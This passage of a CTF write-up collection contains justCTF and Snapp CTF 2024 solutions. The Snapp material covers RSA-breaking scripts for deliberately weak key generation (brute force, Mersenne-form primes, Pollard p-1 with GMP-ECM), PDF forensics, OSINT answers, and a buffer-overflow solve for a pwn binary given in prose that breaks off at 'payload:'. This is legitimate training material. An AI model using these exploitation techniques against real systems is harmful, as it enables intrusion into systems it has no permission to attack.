_board);\n            i = i + 1;\n        };\n\n        // buy flag\n        let mut final_ticket = Otter::enter_tavern(_player);\n        Otter::buy_flag(&amp;mut final_ticket, _player);\n        Otter::checkout(final_ticket, _player, _ctx, _vault, _board);\n    }\n\n}\n</code></pre> <pre><code>Flag: justCTF{Ott3r_uses_expl0it_its_sup3r_eff3ctiv3}'\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/","title":"snapp ctf 2024 writeups","text":"<p>We participated in snapp ctf 2024 and ranked 3 among 174 teams with 5 first bloods  (1 crypto 1 pwn and 3 reverse) Here are our writeups for the challenges we solved.</p> Category Challenges crypto CryptosBombasticBlexGrail pwn Snapp admin Snapp shell reverse Visits TurnOB Blink web Snapp catSnapp falWelcome forensics Snapp Report osint Snapp RecordsSnapp BountiesSnapp CustomersSnapp Saving"},{"location":"2024/Snapp-ctf-2024/crypto/Blex/","title":"Blex","text":"<p>Blex cryptosystem, despite its sluggish pace, boasts unparalleled security, resilient against all attacks. Now, examine its unyielding strength.</p> <pre><code>#!/usr/bin/env python3\n\nimport sys\nfrom Crypto.Util.number import *\nfrom flag import flag\n\n\ndef die(*args):\n  pr(*args)\n  quit()\n\ndef pr(*args):\n  s = \" \".join(map(str, args))\n  sys.stdout.write(s + \"\\n\")\n  sys.stdout.flush()\n\ndef sc(): \n  return sys.stdin.buffer.readline()\n\ndef keygen(r):\n  assert len(r) &lt;= 60\n  v, l = int(r, 16), len(r)\n  e = (64 - l) &lt;&lt; 4\n  u, w = v &lt;&lt; e, 2 ** (e &gt;&gt; 1)\n  for _ in range(110):\n    r = getRandomRange(1, w)\n    p = r + u\n    while p &gt;&gt; e == v:\n      if isPrime(p):\n        while True:\n          x, y = [2 * getRandomNBitInteger(p.bit_length() &gt;&gt; 2) for _ in '__']\n          P, Q = x * p | 1, y * p | 1\n          if isPrime(P) and isPrime(Q):\n            return P, Q\n      p += 1\n\ndef main():\n  border = \"|\"\n  pr(border*72)\n  pr(border, f\"Welcome to Blex task! Your mission is break our complex cryptosystem\", border)\n  pr(border*72)\n  pr(border, f\"please provide your desired seed to generate key in hex:\")\n  seed = sc().decode()\n  try:\n    _b = len(seed) &lt;= 60 and int(seed, 16) &gt;= 0\n  except:\n    die(border, f\"The seed you provided is either not in hex or is not valid!\")\n  if _b:\n    pr(border, f\"Generating keypair, please wait...\")\n    p, q = keygen(seed)\n    e, n =  65537, p * q\n    m = bytes_to_long(flag)\n    assert m &lt; n\n    c = pow(m, e, n)\n    pr(border, f'n = {n}')\n    pr(border, f'c = {c}')\n  else:\n    die(border, f\"Your seed is too long!!!\")\n\nif __name__ == '__main__':\n  main()\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/crypto/Blex/#solution","title":"Solution","text":"<p>the code simply does these steps 1. get an input from user as a seed 2. generates <code>P,Q</code> (RSA prime factors) based on that seed with an special algorithm 3. encrypts the flag with generated RSA key</p> <p>The key generation part is interesting. let's break it down to see what is happening under the hood</p> <ol> <li>consider our seed as <code>s</code></li> <li>it casts it to decimal base as <code>v</code> and the hex value length as <code>l</code></li> <li>then it generates <code>e</code> as  \\((64-l) * 16\\) (e is dependent on <code>l</code>, the larger the <code>l</code> or seed length, the smaller value for <code>e</code> )</li> <li>two values <code>u,w</code> are generated: \\(u = v * 2^{e}\\) and \\(w = 2^{(e/2)}\\) (<code>u</code> and <code>v</code> both are dependent on <code>e</code>, it means the larger seed length -&gt; the smaller <code>e</code> -&gt; the smaller <code>u</code> and <code>w</code>)</li> <li>then it enters a for loop<ol> <li>first it generates a random <code>r</code> in range <code>[1,w)</code> -&gt; not including <code>w</code> itself </li> <li>then the code calculates a <code>p</code> like: \\(p = r + u\\)</li> <li>then it enters a loop <ol> <li>first it generates a pair <code>(x,y)</code> in length of \\(bitlen(p)/4\\) bit</li> <li>then it calculates <code>P</code> and <code>Q</code> like: \\(P = x * p | 1\\) and \\(Q = y * p | 1\\) -&gt; <code>|</code> is OR bit-wise operator means if \\(xp\\) or \\(yp\\) are even (0 value for LSB bit) it will make it <code>1</code> . so it will be \\(xp + 1\\) or \\(xp\\). it all depends on if \\(xp\\) is even or odd. we know that <code>P</code> and <code>Q</code> should be prime so they can not be in form of \\(P = xp\\)  and \\(Q = yp\\) so they should be in form of \\(P = xp + 1\\) and \\(Q = yp + 1\\)</li> <li>return <code>P</code> and <code>Q</code> when they both are prime and these are our RSA factors</li> </ol> </li> </ol> </li> </ol> <p>if we look deep into the algorithm the value of <code>P</code> and <code>Q</code> are highly dependent on our seed value and length. Let's run the code with seed  <code>0</code></p> <p></p> <p>as we can see the primes are large although the value <code>v</code> is small but the <code>e</code> is large because of small length of seed let's examine this seed <code>'0'*59</code></p> <p></p> <p>our <code>v</code> and <code>e</code> are the smallest possible and we can see the factors are very small that makes it easy to factorize <code>n</code> and break RSA but there is an issue here </p> <p>because our <code>n</code> is very small (<code>n&lt;m</code>) so we can not get the encrypted flag. let's see how n is generated based on our seeds</p> <p> \\(n = P \\cdot Q\\) <p>\\(P = p \\cdot x + 1\\)</p> <p>\\(Q = p \\cdot y + 1\\)</p> <p>\\(n = (p \\cdot x + 1) \\cdot (p \\cdot y + 1) \\quad \\longrightarrow \\quad 2^{\\left(\\frac{\\log_2{p}}{4}-1\\right)} &lt; x,y &lt; 2^{\\frac{\\log_2{p}}{4}}\\)</p> <p>\\(n = (p^2) \\cdot (x \\cdot y) + p \\cdot x + p \\cdot y + 1\\) </p> <p>The solution I was thinking about was about first find <code>p</code> then find <code>x,y</code> and calculate <code>P,Q</code>. I was thinking about brute-forcing them but it only is possible when they are small. let's see how we can feed our algorithm with a seed that <code>p,x,y</code> are small meanwhile <code>P</code> and <code>Q</code> are large enough such that <code>n &gt; m</code>.</p> <p>The thing I was sure about to consider <code>l</code> as maximum possible value (60) because it results in small <code>e</code> then small <code>w</code> we know  <code>w</code> is only dependent on <code>l</code> and <code>p</code> is dependent on <code>r</code> and <code>u</code> because we have the value <code>u</code> we only need <code>1 &lt; r &lt; w</code> to find <code>p</code>. so the larger <code>l</code> leads to smaller <code>e</code> and smaller <code>w</code> and smaller <code>r</code> and makes it easier to find <code>r</code> if we consider <code>l</code> as 60 the <code>w</code> will value be like this</p> <p> \\(l = 60\\) <p>\\(e = (64-l)*2^{4}\\)</p> <p>\\(e = 4*2^{4}\\)</p> <p>\\(e = 64\\)</p> <p>\\(w = 2^{(e/2)}\\)</p> <p>\\(w = 2^{32}\\)</p> <p>\\(w = 4294967296\\)</p> <p>\\(1 &lt; r &lt; 4294967296\\) </p> <p>we have <code>u</code> we only need to predict r to find p</p> <p>after some trial/error I found this value which generates reasonable value for p that \\(P*Q &gt; m\\) and also \\(x,y\\) are not large</p> <pre><code>000000000000000000000000000000000000000000000000027aaaaaaaa\n</code></pre> <p></p> <p>after trying several times with seed value of <code>000000000000000000000000000000000000000000000000027aaaaaaaa</code> and failing of <code>asser m &lt; n</code> finally I could get a pair of <code>n,c</code> like this <pre><code>n = 37931218957771298432929684440033399181023597655092027699229762505394899064299\nc = 37619517047698062658731745404907573919781841044311054904796485400329681024110\n</code></pre></p> <p>here we have these conditions</p> <pre><code>1 &lt; r &lt; 4294967296\n\n&gt;&gt;&gt; p = 3142717113053520895163729936831\n&gt;&gt;&gt; p.bit_length() &gt;&gt; 2\n25\n&gt;&gt;&gt; 2 ** 24\n16777216\n&gt;&gt;&gt; 2 ** 25\n33554432\n\n2*16777216 &lt; x , y &lt; 2*33554432\n</code></pre> <p>OK now we can brute force the range <code>(1, 4294967296)</code> to find <code>r</code> but how to verify what the correct <code>r</code> is? we know that:</p> <p><pre><code>n = (p**2)*(x*y) + p*x + p*y + 1\n# we can verify correct r like this\n\nif (n-1) % (u+r) == 0\n# p = u + r\n</code></pre> \\(n = (p^2)(x \\cdot y) + p \\cdot x + p \\cdot y + 1\\)</p> <p>We can verify correct \\(r\\) like this:</p> <p>If \\((n - 1) \\mod (u + r) = 0\\), then \\(p = u + r\\).</p> <p>after find the correct <code>r</code> we can brute force and find <code>x,y</code> like this we know that \\(P = x*p + 1\\) so <code>n</code> divides \\(x*p + 1\\) so \\(n-1\\) divides both  <code>x</code> and <code>p</code></p> <pre><code>bits = p.bit_length() &gt;&gt; 2 # bits = 25\nfor x in range(2 * 2**(bits-1), 2*2**bits):\n    if (n % (x*p + 1)) == 0:\n        print(x)\n</code></pre> <p>Let's code all these levels to see if we can recover <code>p,x,y</code> and factorize <code>n</code></p> <pre><code>from Crypto.Util.number import *\n\nn = 37931218957771298432929684440033399181023597655092027699229762505394899064299\nc = 37619517047698062658731745404907573919781841044311054904796485400329681024110\ns = '000000000000000000000000000000000000000000000000027aaaaaaaa\\n'\n\nv, l = int(s, 16), len(s)\ne = (64 - l) &lt;&lt; 4\nu, w = v &lt;&lt; e, 2 ** (e &gt;&gt; 1)\n\nr = 0\nfor rr in range(w, 0, -1):\n    p = rr + u\n    if (n-1) % p == 0:\n        r = rr\n        print(f\"r = {r}\")\n\nxy = []\nbits = p.bit_length() &gt;&gt; 2\nfor x in range(2 * 2**(bits-1), 2*2**bits):\n    if (n % (x*p + 1)) == 0:\n        print(x)\n        xy.append(x)\n\np = r + u\n\nP = xy[0]*p + 1\nQ = xy[1]*p + 1\ne = 0x10001\nphi = (P-1)*(Q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m).decode()\nprint(flag)\n</code></pre> <p>the code will take some time to find the correct <code>r</code> but after that it will find <code>x,y</code> and decrypts the flag</p> <p></p> <pre><code>SNAPP{b3Y0nd_4Ny_FoRM_1n_8lEx!?}\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/crypto/Bombastic/","title":"Bombastic","text":"<pre><code>#!/usr/bin/env python3\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef check(n):\n  sn = str(n)\n  l, P = len(str(n)), []\n  for i in range(1, l - 1):\n    for j in range(i + 1, l):\n      g, e, a = int(sn[:i]), int(sn[i:j]), int(sn[j:])\n      if isPrime(g ** e + a):\n        P.append(g ** e + a)\n      if isPrime(g** e - a):\n        P.append(g ** e - a)\n  return P\n\ndef keygen(nbit):\n  while True:\n    r = getRandomNBitInteger(18)\n    if len(check(r)) != 0:\n      cr = check(r)\n      cr.sort()\n      p = cr[-1]\n      if p.bit_length() &gt;= nbit:\n        return r, p\n\ndef encrypt(msg, pubkey):\n  m = bytes_to_long(msg)\n  assert m &lt; pubkey\n  c = pow(m, 65537, pubkey)\n  return c\n\np, q = keygen(256)[1], keygen(256)[1]\npubkey = p * q\nenc = encrypt(flag, pubkey)\n\nprint(f'n = {pubkey}')\nprint(f'enc = {enc}')\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/crypto/Bombastic/#solution","title":"Solution","text":"<p>At the first view I couldn't understand the prime generation algorithm neither in static nor dynamic approach. So I passed the <code>n</code> to RsaCtfTool to see what is the issue about generating primes in this strange way. this is the output of the tool</p> <p></p> <p>so it is all about mersenne primes, after searching about them it seems they are primes that are in form of \\(2^{n} - 1\\). I generated two primes with this algorithm to examine them </p> <p>it seems these numbers are not form of \\(2^{n} - 1\\) but the number 1 may be different for them so I used this code to find what form they are in:</p> <pre><code>p = 858099707516326214372737599885174152158679412517913176174307932398192897924707006515319955082681819372162038923935107254640248499964580476571753536389382243\nq = 2462625387274654950767440006258975862817483704404090416746768337765357610718575663213391640930307227550414249394111\n\nfor i in range(-1000, 10000):\n    if (p + i) % 2**32 == 0:\n        print(f\"p =&gt; 2**n - {i}\")\n    if (q + i) % 2**32 == 0:\n        print(f\"q =&gt; 2**n - {i}\")\n</code></pre> <p></p> <p>so in this example we see that p is in form of \\(2^{n} + 99\\) and q is in form of \\(2^{n} - 65\\) Finally I used RsaCtfTool to decrypt the <code>c</code> with mersenne primes method</p> <p></p>"},{"location":"2024/Snapp-ctf-2024/crypto/Cryptos/","title":"Cryptos","text":"<p>Discover the world of\u00a0cryptos\u00a0in SNAPP CTF, solve challenges, and kindle your love for cryptography with exciting tasks.</p> <pre><code>#!/usr/bin/env python3\n\nfrom decimal import *\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef encode(n, p):\n  getcontext().prec = p + len(str(n)) + 2\n  x, y = Decimal(n), Decimal(1)\n  r = Decimal(10) ** Decimal(-p)\n  while x &gt;= r + y:\n    x = (x + y) / 2\n    y = n / x\n  result = str(round(x - (r / 2), p)).replace('.', '')[::-1]\n  return result\n\ndef encrypt(msg, n):\n  assert n &gt;= 2\n  m = n * bytes_to_long(msg)\n  c = encode(m, p).lstrip('0')\n  return c\n\nglobal p\np = 1024\nn = getRandomNBitInteger(p &gt;&gt; 6)\nc = encrypt(flag, n)\nprint(f'c = {c}')\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/crypto/Cryptos/#solution","title":"Solution","text":"<p>the code is pretty much simple, it's encoding a message in these steps:</p> <ol> <li>it generates a <code>(1024&gt;&gt;6)</code> or 16 bit random number [32768, 65536]</li> <li>multiply flag decimal value by it</li> <li>encode it using this algorithm<ol> <li>\\(x = n, y = 1\\)</li> <li>\\(x = (x+y) / 2\\) , \\(y = n/x\\)</li> <li>repeat until \\(x \\geq y + r\\) : (r is very small value near to zero)</li> </ol> </li> <li>round <code>x</code> by <code>p</code> floating point which is \\(1024 + len(n) + 2\\)</li> <li>eliminate the <code>.</code> and reverse it</li> </ol> <p>if we switch to dynamic approach we can see that the loop is about taking square root of initial value</p> <p></p> <p></p> <p>so the encode function will be simply like this</p> <pre><code>def encode(n, p):\n  getcontext().prec = p + len(str(n)) + 2\n  x, y = sqrt(n)\n  result = str(round(x - (r / 2), p)).replace('.', '')[::-1]\n  return result\n</code></pre> <p>to get <code>m*n</code> we should first reverse the result then power it up to exponent 2 </p> <p>I used this code to do that <pre><code>c = '5045178894357626075431384420860360647034114401723872009235472900716359915220507491073960091678247276121410336208043903213023270852375878447784137648224298070437468162688759757920721723781604874151511572882769621941513872944171938170800255953999521262507633248122058585326636562475057264132441892290385234155811673238225858794265110896113943435633328964169010801463217935967353264871894098875705195581754210881067786818256285938683517110450003983693265702180080692280190636422223594905498601205618208238650519192521153660957941553495169629553425307135627310090665836554328620333233651748363605006405700561070148067374204713428800371202120708720303368873063856187395746236050232433322757367599705756026681249243491427692831512293583163552663661247047141621453850846452005560242532098020050458041224274532870717854358073569467859182280543593485795867269334718276231423506951784977870960076921603401799962900400216905993065516167476079796078242649399762978533503541077936264107413956207423841535073828559129349967201715665207852577917834390795702440085535969037233161141789375751'\nc = c[::-1].replace('.', '')\nmn = int(str(int(c) ** 2)[:-2048]) + 1\n</code></pre></p> <p>the reason I remove the the floating point <code>.</code> and calculate it's second power then eliminate last 2048 digits is a basic mathematical method we learnt in fourth class it is about multiplying float numbers which says multiply the numbers without considering the floating point, after multiplying them add the floating point for sum of number of digits for two numbers which here is <code>2*1024=2048</code>. at the end I add an extra  <code>1</code> because the floating most significant digits are all 9 which means we need extra 1.</p> <p>here is the final code which decode the flag</p> <pre><code>from Crypto.Util.number import *\n\nc = '5045178894357626075431384420860360647034114401723872009235472900716359915220507491073960091678247276121410336208043903213023270852375878447784137648224298070437468162688759757920721723781604874151511572882769621941513872944171938170800255953999521262507633248122058585326636562475057264132441892290385234155811673238225858794265110896113943435633328964169010801463217935967353264871894098875705195581754210881067786818256285938683517110450003983693265702180080692280190636422223594905498601205618208238650519192521153660957941553495169629553425307135627310090665836554328620333233651748363605006405700561070148067374204713428800371202120708720303368873063856187395746236050232433322757367599705756026681249243491427692831512293583163552663661247047141621453850846452005560242532098020050458041224274532870717854358073569467859182280543593485795867269334718276231423506951784977870960076921603401799962900400216905993065516167476079796078242649399762978533503541077936264107413956207423841535073828559129349967201715665207852577917834390795702440085535969037233161141789375751'\nc = c[::-1].replace('.', '')\nmn = int(str(int(c) ** 2)[:-2048]) + 1\n\nfor n in range(2**15, 2**16):\n    if mn % n == 0:\n        m = mn // n\n        flag = long_to_bytes(m).decode()\n        if 'SNAPP' in flag:\n            print(flag)\n</code></pre> <p></p>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/","title":"Grail","text":"<p>Grail cryptosystem employs elementary math to safeguard valuable secrets. Despite strengths, it harbors vulnerabilities requiring careful consideration.</p> <pre><code>#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef make_prime(nbit):\n  while True:\n    p = 2\n    for _ in range(nbit &gt;&gt; 5):\n      p *= getPrime(nbit &gt;&gt; 4)\n    p += 1\n    if isPrime(p):\n      return p\n\ndef encrypt(msg, pubkey):\n  m = bytes_to_long(msg)\n  assert m &lt; pubkey\n  c = pow(m, 0x10001, pubkey)\n  return c\n\nnbit = 512\np = make_prime(512)\nq = getPrime(2 * nbit - p.bit_length())\n\npubkey = p * q ** 2\nenc = encrypt(flag, pubkey)\n\nprint(f'n = {pubkey}')\nprint(f'c = {enc}')\n</code></pre> <p>this challenge is about generating two prime factors and a public modulus <code>n</code> like <code>n = p * q * q</code> and encrypt a flag with it the prime generation part is interesting let's see what's happening</p> <pre><code>def make_prime(nbit):\n  while True:\n    p = 2\n    for _ in range(nbit &gt;&gt; 5):\n      p *= getPrime(nbit &gt;&gt; 4)\n    p += 1\n    if isPrime(p):\n      return p\n</code></pre> <p>if we look at the algorithm, the prime generation isn't trivial safe method and is like this:</p> <p> \\(p, q = x_1 \\cdot x_2 \\cdot x_3 \\cdot x_4 \\cdot x_5 \\cdot \\ldots \\cdot x_{16} + 1\\) <p>\\(2^{31} &lt; x_1, x_2, x_3, \\ldots, x_{16} &lt; 2^{32}\\) </p> <p>in mathematics we call these numbers smooth numbers. in another words both <code>p-1</code> and <code>q-1</code> have prime factors less than <code>4294967296</code> which are called 32-bit smooth numbers. you can read about smooth numbers here. using of smooth numbers when generating prime factors is not a safe idea. because there is an algorithm called pollard p-1 which is about factoring a composite number <code>n</code> while all its prime factors <code>p-1</code> are  power-smooth. and this smoothness is not that large (here it is 32 bit which is reasonable) </p>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/#solution","title":"Solution","text":"<p>By definition </p> <p>Further, m is called B-powersmooth (or B-ultrafriable) if all prime powers \\(p^v\\) dividing m satisfy: \\(p^v \\leq B\\)</p> <p>Here we can use <code>Pollard's p \u2212 1</code> algorithm because our integer <code>n</code>'s factor <code>p-1</code>,<code>q-1</code> are <code>4294967296-smooth</code> which satisfies our conditions.</p>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/#pollards-p-1-algorithm","title":"Pollard's p \u2212 1 Algorithm","text":"<p>Here are the overall steps:</p> <ol> <li>select a smoothness bound <code>B</code> (we should use <code>4294967296</code>)</li> <li>choose a random base <code>a</code> co-prime to <code>n</code></li> <li>define <code>M = factorial(B)</code></li> <li>compute <code>g = gcd(a**M - 1, n)</code></li> <li>if <code>1 &lt; g &lt; n</code> then <code>g</code> is one of the factors</li> <li>if <code>g == 1</code> select larger <code>B</code> and try again</li> <li>if <code>g == n</code> select smaller <code>B</code> and try again</li> </ol>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/#pollards-p-1-algorithms-proof","title":"Pollard's p \u2212 1 Algorithm's proof","text":"<p>Let's see how this algorithm works</p>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/#fermats-little-theorem","title":"Fermat's Little Theorem","text":"<p>We know that for every prime number <code>p</code> and a random number <code>a</code> co-prime to <code>p</code> we can write</p> <p> \\(a^{(p-1)} \\equiv 1 \\pmod{p}\\) <p>or</p> <p>\\(a^{(p-1)} - 1 = p \\cdot r\\) </p> <p>In other words \\(a^{(p-1)} - 1\\) has two factors <code>p,r</code> and <code>p</code> is prime. We can also multiply <code>p-1</code> with <code>k</code>:</p> <p> \\(a^{k \\cdot (p-1)} \\equiv 1 \\pmod{p}\\) <p>or</p> <p>\\(a^{k \\cdot (p-1)} - 1 = p \\cdot s\\) </p>"},{"location":"2024/Snapp-ctf-2024/crypto/Grail/#the-proof","title":"The proof","text":"<p>From previous equations we can conclude:</p> <p> \\(\\text{gcd}(a^{k \\cdot (p-1)} - 1, n) = p\\) <p>\\(\\text{B} = k \\cdot (p-1)\\)</p> <p>\\(\\text{gcd}(a^B - 1, n) = p\\) </p> <p>If we can calculate <code>B</code> and choose any integer <code>a</code> co-prime to <code>n</code>(2 is the best choice), then we can find <code>p</code> with <code>gcd</code> operation. simple huh?! But how to find <code>B</code>. We know that:</p> <p> \\(B = k \\cdot (p-1)\\) <p>\\(p-1 = p_1 \\cdot p_2 \\cdot p_3 \\cdot \\ldots \\cdot p_x\\) </p> <p>And we know that <code>p-1</code> is <code>power-smooth</code> which means that all factors of <code>p-1</code>(<code>p1, p2, ..., px</code>) are less than <code>4294967296</code> So if we choose B=\\(1.2.3.4.....4294967296\\) and calculate that we can assure that <code>B</code> has <code>p</code> inside its factor and gcd of \\(a^{B} - 1\\) with <code>n</code> will result in <code>p</code> which is one of the factors.</p> <p>All sounds cool! but is it easy to calculate <code>factorial(4294967296)</code> specially in python? definitely not! it will take a looong time and memory to find those primes. instead of that I used ecm utils, which is a powerful and optimal integer factorization tools, you can also use yafu which it also uses ecm.</p> <p>if we look at the man page of ecm we see we can use it for special purposes like pollard p-1 algorithm</p> <p></p> <p>how to use ecm for our goal, if we look at Two-stage variant of this link we see that there is another variant for pollard p-1 algorithm which are for composite numbers that their prime factors <code>p-1</code> have two different boundaries for their prime factors one is B1 an the other is B2. if we look at the man page of ecm it implements this utility by providing two boundaries <code>B1</code> and <code>B2</code>. because we only have one boundary here (<code>2**32</code>) we can put equal value for both of them and use it for our goal</p> <p>so we're gonna use ecm with two equal boundaries <pre><code>\u279c  ~ echo 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 | ecm -pm1 4294967296 4294967296\nGMP-ECM 7.0.4 [configured with GMP 6.2.1, --enable-asm-redc] [P-1]\nInput number is 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 (464 digits)\nUsing B1=4294967296, B2=4294967328, polynomial x^1, x0=4248787747\nStep 1 took 5257888ms\n********** Factor found in step 1: 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\nFound prime factor of 153 digits: 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\nComposite cofactor 359339148219430319280089093265239884758034574636452597711238478104459134171973120770298288584658864887725190578210632161098277750292496622577052826229137258086647336771350031270088547539336870855964992863875205318437496664120219095344484150789429241919483604923061620946207848824960877467377903440365432510559849 has 312 digits\nReport your potential champion to Paul Zimmermann &lt;zimmerma@loria.fr&gt;\n(see http://www.loria.fr/~zimmerma/records/Pminus1.html)\n</code></pre></p> <p></p> <p>excellent, we found the prime factor <code>p</code> and a composite factor which is <code>q**2</code> now let's write our final code to decrypt the flag. To be honest there is no need to calculate <code>q</code>. with just <code>p</code> and its relevant <code>d</code> you can find the flag because this is a <code>3-prime</code> variant of RSA.</p> <pre><code>echo 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 | ecm -pm1 4294967296 4294967296\np = 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\n</code></pre> <pre><code>from Crypto.Util.number import *\n\nn = 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887\nc = 18438522198977155755872369073173517918203417931951458175663749127772053822610354477488382931648204112363708747300333279964863287907821749491918178632833296879643102108322183879396960621080385271708526432735445408218922762232344776571397157271654216251665202720050665755807242355490753461576547890363093564721184099967652686729464944824967135201979335166915502492388799588271020179969104407201131683522897318106586922050389249019689732226480944822582494823555270535\ne = 0x10001\n\np = 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\n\nassert (n % p) == 0\ndp = pow(e, -1, p-1)\n\nmp = pow(c, dp, p)\nprint(long_to_bytes(mp).decode())\n</code></pre> <p></p>"},{"location":"2024/Snapp-ctf-2024/forensics/snapp_report/","title":"Snapp Report","text":""},{"location":"2024/Snapp-ctf-2024/forensics/snapp_report/#snapp-report","title":"Snapp Report","text":"<pre><code>The classified [**SNAPP report**](https://snappctf.com/tasks/snapp_report_6a0602c6d19b6aa8bb6b9fb75c3191a941af30da.txz) on the latest Capture The Flag (CTF) reveals groundbreaking strategies and vulnerabilities, reshaping cybersecurity paradigms.\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/forensics/snapp_report/#solution","title":"Solution","text":"<p>Starting with the challenge when I realized that the challenge is a pdf I searched for <code>pdf forensics ctf</code> and came across this link and so at first try with <code>Ctrl + A</code> I found there are some hidden texts inside the circle and so copied and pasted the text and figured the flag out HOWEVER at the time the flag was wrong on the platform and couldn't submit the flag until I saw that there were two solves figured that probably the flag is fixed and it was.</p> <p> </p>"},{"location":"2024/Snapp-ctf-2024/misc/prying_eyes/","title":"Prying eyes","text":""},{"location":"2024/Snapp-ctf-2024/misc/prying_eyes/#description","title":"Description","text":"<pre><code>**\u03bb** a cryptic operator in esoteric languages, safeguards secret messages from **prying eyes**. Embrace its power to conceal truth. Can you read the following message:\n\n```s``.s`.1._`.:```k.tik`d`.F```.&amp;``c.E.C.Tr```s`.N`.S`._.S```.P`.P```k.Ad._._i`.e`.h`.tk\n\n**Flag:** `SNAPP{Secret_Message}`\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/misc/prying_eyes/#solution","title":"Solution","text":"<p>After long hours of searching in cipher identifiers and searching for lambda and prying eyes, I decided to search for esoteric languages and lambda (<code>\u03bb a cryptic operator in esoteric languages</code>) which led me to here leading to here and then here making sure of the name tried searching for online compilers and finally getting the flag from this tools</p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_bounties/","title":"Snapp Bounties","text":"<p>How many reports has\u00a0SNAPP\u00a0paid bounties for? How many hackers have been paid bounties? Concatenate the first number to the second and send the flag as\u00a0<code>SNAPP{X-Y}</code>, where\u00a0<code>X</code>\u00a0and\u00a0<code>Y</code>\u00a0are the answers to the questions.</p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_bounties/#solution","title":"Solution","text":"<p>I searched about snapp bug bounty program statistics like below</p> <p></p> <p>the first link was a blog post about snapp bug bounty program which indicates snapp paid 80 bounties for 36 hackers </p> <p></p> <p>and this is the flag</p> <pre><code>SNAPP{80-36}\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_customers/","title":"Snapp Customers","text":""},{"location":"2024/Snapp-ctf-2024/osint/snapp_customers/#description","title":"Description","text":"<p><code>SNAPP Customers What is the total number of employees in SNAPP's subsidiary companies? What is the total number of users of SNAPP Super App? How many items are in the largest order of SNAPP Food? Please send the answer in the format SNAPP{X-Y-Z}, where X, Y, and Z are the answers to the questions respectively.</code></p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_customers/#solution","title":"Solution","text":"<p>During my Open Source Intelligence (OSINT) investigation, I uncovered valuable information related to the question by exploring Google search results. The key lead I followed was the reference to a document titled \"1401 Annual Report.\" The next step involved accessing and scrutinizing the content within the \"1401 Annual Report.\" This document likely contains pertinent information relevant to the initial question. </p> <p> </p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_records/","title":"Snapp Records","text":""},{"location":"2024/Snapp-ctf-2024/osint/snapp_records/#description","title":"Description","text":"<p><code>SNAPP Record What is the record for the number of trips made by SNAPP in a single day? What is the record for the number of transactions with SNAPP Pay credit service? Please send the answer in the format SNAPP{X-Y}, where X and Y are the answers to the questions respectively.</code></p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_records/#solution","title":"Solution","text":"<p>I've just searched question in persian with Google.</p> <p> </p>"},{"location":"2024/Snapp-ctf-2024/osint/snapp_saving/","title":"Snapp Saving","text":"<p>Which SNAPP service allows saving 250,000 Tomans in month? Send the answer like <code>SNAPP{SERVICENAME}</code>.</p> <p>after googling some key words:</p> <p></p> <p></p> <p>it seems the service is snapp pro. so the flag would be like this</p> <pre><code>SNAPP{SNAPPPRO}\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/pwn/snapp_admin/","title":"Snapp admin","text":""},{"location":"2024/Snapp-ctf-2024/pwn/snapp_admin/#snapp-admin","title":"Snapp Admin","text":"<pre><code>I'm in a hurry and I don't have enough money. Find my [**discount**](https://snappctf.com/tasks/snapp_admin_d2cb1554b1532e3735e4c6f31d8cc396b356083c.txz) code.\n\n`nc 91.107.177.236 1337`\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/pwn/snapp_admin/#solution","title":"Solution","text":"<p>At first I ran the program to analyse how does it work, after that realizing that the first input is not vulnerable to overflow, I searched the program for the password that it was asking and reading the assembly code of the program I figured that with  correct password ( <code>9606</code> ) there is a way to a <code>gets</code> function which allows overflow ( 56 length padding ) to jump inside the <code>is_admin</code> function however there is a condition which can be bypassed easily by just passing the address after the condition which shows the flag.</p> <p>payload: 